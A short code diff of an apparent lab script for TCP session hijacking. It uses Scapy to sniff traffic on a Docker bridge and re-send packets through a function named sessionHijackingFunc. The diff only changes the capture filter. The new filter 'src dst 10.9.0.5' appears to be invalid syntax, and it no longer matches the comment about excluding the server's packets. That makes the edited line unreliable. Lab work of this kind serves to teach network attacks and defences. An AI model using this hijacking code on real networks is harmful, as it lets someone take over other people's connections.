@@ -18,5 +18,5 @@ def sessionHijackingFunc(pkt):
         ls(pkt)
         send(pkt, verbose=0)
 
-f = "tcp and not ether src 02:42:fa:a7:22:45 and src host 10.9.0.6" # Excluding our own generated packets and packets from the server.
+f = "tcp and not ether src 02:42:fa:a7:22:45 and src dst 10.9.0.5" # Excluding our own generated packets and packets from the server.
 pkt = sniff(iface="br-fa4ab2f34bed", filter=f, prn=sessionHijackingFunc)
